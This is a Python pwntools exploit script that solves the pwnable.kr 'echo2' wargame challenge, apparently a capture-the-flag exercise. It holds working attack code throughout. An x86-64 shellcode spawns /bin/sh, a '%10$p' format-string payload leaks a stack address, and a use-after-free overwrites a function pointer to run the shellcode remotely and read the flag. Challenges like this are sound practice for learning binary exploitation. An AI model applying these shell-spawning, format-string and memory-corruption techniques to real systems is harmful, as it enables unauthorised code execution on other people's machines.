from pwn import *
import argh


context.arch = 'amd64'
context.log_level = 'info'
ADDR = 'pwnable.kr'
PORT = 9011


shellcode = '''
xor rdx, rdx
xor rax, rax
push rax
movabs rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
mov al, 59
syscall
'''


def start_gdb(exe_name):
    return gdb.debug([exe_name], '''
    # display/6wx 0x602080
    # display/2wx 0x602098
    # display/wx 0x6020a0
    display/10wx *0x0602098
    # b *0x400ac9
    # this is scanf for the choice
    # b *0x400a60
    # this is to stop when calling greetings from echo2
    # b *0x400845
    # this is printf in echo2
    # b *0x400864
    # this is to stop when calling the proper echo function
    b *0x400ac9
    layout regs
    continue
    ''')


def set_name(p, name):
    p.recvuntil('your name? : ')
    p.sendline(name)


def free_mem(p):
    p.recvuntil('exit\n> ')
    p.sendline('4')
    p.recvuntil('(y/n)')
    p.send('n')


def change_greetings_addr(p, addr):
    p.recvuntil('exit\n> ')
    p.sendline('3')
    p.recvline()
    p.send('A' * 0x18 + p64(addr))
    p.recvuntil('goodbye')
    p.recvline()


def call_echo2(p, payload):
    p.recvuntil('exit\n> ')
    p.sendline('2')
    p.recvline()
    p.sendline(payload)
    echo_res = p.recvline()
    # p.recvuntil('goodbye')
    p.recvline()
    return echo_res


@argh.arg('--local', '-l', help='Run Locally')
@argh.arg('--runpwn', '-r', help='Run Remotely')
def main(local=False, runpwn=False):
    p = None
    bin_path = './echo2'
    e = ELF(bin_path)

    if local:
        p = start_gdb(bin_path)
    elif runpwn:
        p = remote(ADDR, PORT)

    set_name(p, asm(shellcode))

    stack = int(call_echo2(p, '%10$p'), base=16)

    free_mem(p)

    change_greetings_addr(p, stack - 0x20)
    p.sendline('cat flag')
    p.recvuntil('exit\n> ')
    print(p.recvline())


if __name__ == '__main__':
    argh.dispatch_command(main)

